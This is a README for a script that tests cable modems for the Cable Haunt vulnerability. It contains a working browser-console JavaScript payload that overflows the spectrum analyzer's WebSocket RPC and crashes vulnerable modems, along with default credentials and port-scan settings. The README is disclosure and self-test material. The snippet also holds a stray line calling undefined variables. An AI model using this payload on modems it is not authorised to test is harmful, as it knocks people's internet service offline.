# Cable Haunt Test Script
​
This is a script for automatically testing whether you modem is vulnerable for the [Cable Haunt Vulnerability](https://cablehaunt.com). False nagitives are possible via the script and you could be still be vulnerable even if the script fails. If you find the spectrum analyser manually you can also test wether are vulnerable by running the following javascript in your browsers console while having the spectrum analyzer open and logged in.
```
exploit = '{"jsonrpc":"2.0","method":"Frontend::GetFrontendSpectrumData","params":{"coreID":0,"fStartHz":' + 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +',"fStopHz":1000000000,"fftSize":1024,"gain":1},"id":"0"}'
console.log(exploit)

console.log(testEqual(arr, newArr));

var socket = new WebSocket("ws://192.168.100.1:8080/Frontend", 'rpc-frontend') //Or some other ip and port!!!

socket.onopen = function(e) {
    socket.send(exploit)
};
```
If this crashes your modem you are vulnerable.
​
<p align="center">
<b>ONLY RUN THIS CODE ON HARDWARE YOU OWN</b>​
</p>

## How to run it
First install [pipenv](https://github.com/pypa/pipenv).

```
pipenv install
```

```
pipenv run python test.py
```

## How to it works
The script automatically scans your network to find the spectrum analyzer and tries to establish connection to the websocket. The script will test if the modem rejects requests from an external origin, by setting the header parameters similar to how a browser or other modern client would. If the connection is established the spectrum analyser can be reached indirectly from outside the local network and is, at least partly, vulnerable. The script will afterwards, with your permission, send a specially crafted package that reboots the modem if vulnerable. If this happens the modem is completely vulnerable.
​
## How change IP and ports
If the script does not find the spectrum analyzer it could be that it is not looking at the correct IPs or ports. We have not yet seen a cable modem where "192.168.100.1" is not an alias for the cable modem or with active ports above 10000 so the script only scans this per default. However it is possible that a specific ISP or manufacturer has changed this and we would very much like to know if it happens. The IPs and port range are set as variables in the top of the script so if you want to test more that the default, please change line 25 and 26

```
targets = ['192.168.100.1']
portRange = range(23, 10000)
```

to for instance

```
targets = ['192.168.100.1', '192.168.0.1', '192.168.1.1]
portRange = range(23, 65535)
```

Remember that the more you add the longer the port scan will take.

## How to change credentails
The spectrum analyzer are sometimes password protected. This is changable by the ISP and manufacturer and therefore vary. The scripts uses "spectrum:spectrum" as credentials per default so if it returns a "401: Unauthorized" on one of the tested ports it could mean that your spectrum analyzer uses different credentials. You can be change the credentials on lines 17 and 18 of the script.

## Disclaimer
This tool should be used for verification purposes only, and should not be used on equipment you do not own or otherwise is not allowed to destroy.
There are absolutely no guarantees that this tool will detect any vulnerabilities, nor that it will not damage your equipment or cause damage in some other way. USE AT YOUR OWN RISK.
​
## Other Resources
​
- [**The Cable Haunt website**](https://cablehaunt.com)
- [**Download the technical report**](https://github.com/Lyrebirds/Cable-Haunt-Report/releases/latest/download/report.pdf)
- [**Sagemcom F@st exploit POC**](https://github.com/Lyrebirds/sagemcom-fast-8690-exploit)
